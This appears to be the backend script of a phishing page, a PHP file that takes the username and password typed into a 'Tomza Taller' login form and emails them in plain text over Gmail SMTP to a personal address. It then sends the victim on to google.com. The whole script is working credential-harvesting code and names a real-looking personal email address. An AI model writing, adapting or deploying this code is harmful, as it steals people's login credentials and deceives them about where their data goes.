<?php
// Evitar acceso directo
if ($_SERVER["REQUEST_METHOD"] !== "POST") {
    header("Location: index.html");
    exit;
}

// Recibir datos
$usuario = trim($_POST["usuario"] ?? "");
$password = trim($_POST["password"] ?? "");

if ($usuario === "" || $password === "") {
    echo "Faltan datos.";
    exit;
}

// --------------------------
// CONFIGURACIÓN SMTP GMAIL
// --------------------------
$host = "smtp.gmail.com";
$puerto = 587;
$seguridad = "tls";
$correo_emisor = "sebastiancq2008@gmail.com";
$clave_app = "PONER_AQUI_TU_CLAVE_DE_16_DIGITOS"; // ← PASO OBLIGATORIO
$correo_destino = "sebastiancq2008@gmail.com";

$asunto = "Nuevo ingreso - Tomza Taller";
$mensaje = "Usuario: " . $usuario . "\n";
$mensaje .= "Contraseña: " . $password . "\n";
$mensaje .= "Fecha: " . date("d/m/Y H:i:s") . "\n";

// Encabezados correctos
$cabeceras = "From: Sistema Tomza <" . $correo_emisor . ">\r\n";
$cabeceras .= "Reply-To: " . $correo_emisor . "\r\n";
$cabeceras .= "MIME-Version: 1.0\r\n";
$cabeceras .= "Content-Type: text/plain; charset=UTF-8\r\n";

// Usamos conexión SMTP segura
$conexion = fsockopen($host, $puerto, $errno, $errstr, 10);
if (!$conexion) {
    echo "Error conexión: $errstr ($errno)";
    exit;
}

function enviar($conexion, $texto) {
    fputs($conexion, $texto . "\r\n");
    return fgets($conexion, 512);
}

enviar($conexion, "EHLO localhost");
enviar($conexion, "STARTTLS");
stream_socket_enable_crypto($conexion, true, STREAM_CRYPTO_METHOD_TLS_CLIENT);
enviar($conexion, "EHLO localhost");
enviar($conexion, "AUTH LOGIN");
enviar($conexion, base64_encode($correo_emisor));
enviar($conexion, base64_encode($clave_app));
enviar($conexion, "MAIL FROM:<" . $correo_emisor . ">");
enviar($conexion, "RCPT TO:<" . $correo_destino . ">");
enviar($conexion, "DATA");
enviar($conexion, $cabeceras . "\r\n" . $mensaje);
enviar($conexion, ".");
enviar($conexion, "QUIT");

fclose($conexion);

// Redirigir a Google
header("Location: https://www.google.com");
exit;
?>
